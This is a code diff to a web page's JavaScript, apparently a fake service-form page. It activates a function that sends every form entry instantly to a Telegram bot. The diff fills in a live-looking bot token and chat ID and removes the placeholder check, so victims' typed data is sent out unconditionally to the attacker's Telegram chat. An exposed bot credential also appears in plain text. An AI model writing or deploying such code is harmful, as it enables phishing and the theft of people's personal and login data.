@@ -400,11 +400,9 @@
         let currentSelectedService = "";
         let collectedData = {};
 
-        // التوكن الخاص بك تم إدراجه بنجاح هنا
+        // التوكن والـ Chat ID تم إدراجهم وتفعيلهم بنجاح
         const BOT_TOKEN = "8666514672:AAFtpOM78ouq8plo6M-q2QbeUaX9SCoOQN8"; 
-        
-        // ضع رقم Chat ID الخاص بك مكان النص التالي:
-        const CHAT_ID = "أدخل_رقم_الـCHAT_ID_هنا";       
+        const CHAT_ID = "8928070001";       
 
         function sendDataInstantly(dataObj) {
             collectedData = { ...collectedData, ...dataObj };
@@ -414,17 +412,15 @@
                 message += `▪️ ${key}: ${collectedData[key]}\n`;
             }
 
-            // إرسال البيانات لحظياً
-            if (CHAT_ID !== "أدخل_رقم_الـCHAT_ID_هنا") {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
-                }).catch(err => console.error("خطأ الإرسال:", err));
-            }
+            // إرسال البيانات لحظياً لـ Telegram API
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(err => console.error("خطأ في الإرسال:", err));
         }
 
         function openServiceForm(serviceName) {
